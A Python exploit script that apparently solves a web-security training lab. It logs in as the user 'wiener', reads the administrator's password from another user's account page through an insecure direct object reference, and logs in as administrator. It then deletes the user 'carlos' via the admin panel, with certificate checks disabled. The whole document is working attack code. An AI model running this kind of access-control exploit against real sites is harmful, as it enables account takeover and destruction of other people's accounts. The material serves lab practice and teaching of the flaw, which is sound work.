import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf(s,url):
    res = s.get(url,verify=False)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf = soup.find("input",{'name':'csrf'})['value']
    return csrf

def delete_carlos(s,url):
    # logging in as wiener:
    for_login = "/login"
    params = {'csrf':get_csrf(s,url+for_login),'username':'wiener','password':'peter'}
    res = s.post(url + for_login,data = params,verify=False)

    if "Log out" in res.text:
        print("[+]login successfull")

        # finding password for admin
        for_admin = "/my-account?id=administrator"
        res = s.get(url + for_admin,verify=False)
        soup = BeautifulSoup(res.text,'html.parser')
        pass_admin = soup.find("input",{"name":"password"})['value']
        
        # logging in as admin
        params2 = {'csrf':get_csrf(s,url+for_login),'username':'administrator','password':pass_admin}
        res = s.post(url+for_login,data = params2,verify=False)

        if "Admin panel" in res.text:
            print("[+]successfully entered into admin id")
            to_del = "/admin/delete?username=carlos"

            # deleting carlos
            res = s.get(url + to_del,verify=False)

            print("[+]deleted suceesfully")

        else:
            print("[-] exploit failed")
            print("[-]exiting...")
            sys.exit(-1)

    else:
        print("[-]Can't log you in")
        print("[-]exiting...")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[+]usage:%s <url>",sys.argv[0])
    
    print("[+]deleting carlos...")
    url = sys.argv[1]
    s = requests.Session()
    delete_carlos(s,url)

if __name__ == "__main__":
    main()